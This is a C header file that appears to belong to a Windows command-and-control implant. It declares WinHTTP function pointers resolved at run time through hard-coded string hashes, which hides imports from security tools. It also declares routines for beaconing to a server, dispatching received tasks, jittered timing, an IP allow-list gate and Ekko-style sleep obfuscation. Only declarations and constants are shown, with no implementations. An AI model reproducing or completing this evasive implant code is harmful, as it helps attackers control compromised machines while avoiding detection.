
#pragma once

#include "common.h"



typedef HINTERNET(WINAPI *fnWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType,
                                         LPCWSTR pszProxyW,
                                         LPCWSTR pszProxyBypassW,
                                         DWORD dwFlags);

typedef HINTERNET(WINAPI *fnWinHttpConnect)(HINTERNET hSession,
                                            LPCWSTR pswzServerName,
                                            INTERNET_PORT nServerPort,
                                            DWORD dwReserved);

typedef HINTERNET(WINAPI *fnWinHttpOpenRequest)(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes,
    DWORD dwFlags);

typedef BOOL(WINAPI *fnWinHttpSendRequest)(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength,
    DWORD_PTR dwContext);

typedef BOOL(WINAPI *fnWinHttpReceiveResponse)(HINTERNET hRequest,
                                               LPVOID lpReserved);

typedef BOOL(WINAPI *fnWinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer,
                                        DWORD dwNumberOfBytesToRead,
                                        LPDWORD lpdwNumberOfBytesRead);

typedef BOOL(WINAPI *fnWinHttpCloseHandle)(HINTERNET hInternet);

typedef BOOL(WINAPI *fnWinHttpQueryHeaders)(HINTERNET hRequest,
                                            DWORD dwInfoLevel, LPCWSTR pwszName,
                                            LPVOID lpBuffer,
                                            LPDWORD lpdwBufferLength,
                                            LPDWORD lpdwIndex);


#define WINHTTP_DLL_HASH 0xC1BEEBA7
#define WinHttpOpen_HASH 0xB602FC4A
#define WinHttpConnect_HASH 0x29D5FBCD
#define WinHttpOpenRequest_HASH 0x08F1A3C9
#define WinHttpSendRequest_HASH 0xD19AA3C7
#define WinHttpReceiveResponse_HASH 0xEF27FECD
#define WinHttpReadData_HASH 0x488C0999
#define WinHttpCloseHandle_HASH 0x7A7F9586
#define WinHttpQueryHeaders_HASH 0x18C58B22
HMODULE GetModuleHandleH(DWORD moduleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD funcHash);
INT HashStringRotr32A(_In_ PCHAR String);
INT HashStringRotr32W(_In_ PWCHAR String);
BOOL checking_connection(BOOL *Connection);
BOOL ip_whitelist_gate(VOID);
BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
                 DWORD *responseLenOut);
VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen);
VOID ekko_sleep(DWORD sleepMs);
DWORD jitter(DWORD baseMs);